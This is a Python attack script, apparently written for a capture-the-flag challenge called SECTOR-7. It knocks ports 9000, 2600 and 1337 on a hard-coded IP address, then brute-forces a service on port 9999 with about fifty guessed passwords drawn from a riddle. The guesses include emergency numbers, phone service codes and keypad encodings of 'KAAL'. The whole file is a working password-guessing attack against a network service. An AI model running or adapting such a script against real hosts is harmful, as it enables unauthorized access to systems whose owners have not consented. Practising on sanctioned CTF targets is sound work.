#!/usr/bin/env python3
"""
SECTOR-7 Emergency Numbers Attack
"His number has always been there. Every phone carries it"
Could refer to emergency numbers or universal phone codes
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    for port in KNOCK_SEQUENCE:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((TARGET_IP, port))
            sock.close()
        except:
            pass
        time.sleep(0.2)

def try_password(password):
    try:
        knock_ports()
        time.sleep(0.3)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, SERVICE_PORT))
        
        banner = sock.recv(4096)
        sock.send((password + "\n").encode())
        time.sleep(0.3)
        
        response = sock.recv(4096)
        sock.close()
        
        resp_text = response.decode('utf-8', errors='ignore')
        
        if "denied" not in resp_text.lower() and "incorrect" not in resp_text.lower():
            print(f"\n[+] Password '{password}' response:")
            print(resp_text)
            if "kaal{" in resp_text.lower() or len(resp_text) > 100:
                return True
        
        return False
    except:
        return False

def main():
    print("[*] SECTOR-7 Emergency/Universal Numbers Attack\n")
    
    passwords = [
        # Emergency numbers
        "911", "112", "999", "000", "110", "119",
        
        # Emergency with context
        "911-9000", "112-2600", "999-1337",
        
        # Universal USSD codes
        "*#06#",  # IMEI
        "*#*#4636#*#*",  # Testing menu
        "##4636##",
        "*#*#8255#*#*",  # GTalk service
        "*#*#232338#*#*",  # WiFi MAC
        
        # Simplified USSD
        "4636",
        "8255",
        "232338",
        
        # Phone service codes
        "*67",  # Block caller ID
        "*69",  # Call return
        "*82",  # Unblock caller ID
        
        # Combine with knock sequence
        "911-9000-2600-1337",
        "112-9000-2600-1337",
        
        # If "His" = KAAL's number
        "KAAL911",
        "KAAL112",
        "KAAL999",
        
        # Phone system codes
        "611",  # Customer service
        "411",  # Directory assistance
        "511",  # Traffic info
        "811",  # Utility location
        
        # International prefix
        "00",
        "011",
        "+",
        
        # Operator codes
        "0",
        "100",
        
        # Try the hint literally - "His number"
        "HisNumber",
        "hisnumber",
        "his_number",
        
        # KAAL's number could be the knock sequence itself
        "9000",
        "2600",
        "1337",
        "9000-2600-1337",
        "900026001337",
        
        # Or KAAL in numbers (phone keypad)
        # K=5, A=2, A=2, L=5
        "5225",
        "KAAL5225",
        
        # SECTOR-7 on phone keypad
        # S=7, E=3, C=2, T=8, O=6, R=7
        "732867",
        "7328677",  # SECTOR-7
        
        # Combine everything
        "5225-9000-2600-1337",
        "732867-9000",
    ]
    
    print(f"[*] Testing {len(passwords)} passwords...\n")
    
    for i, pwd in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] {pwd}")
        if try_password(pwd):
            print(f"\n[!!!] SUCCESS! Password: {pwd}")
            return
        time.sleep(0.4)
    
    print("\n[-] No password found")

if __name__ == "__main__":
    main()
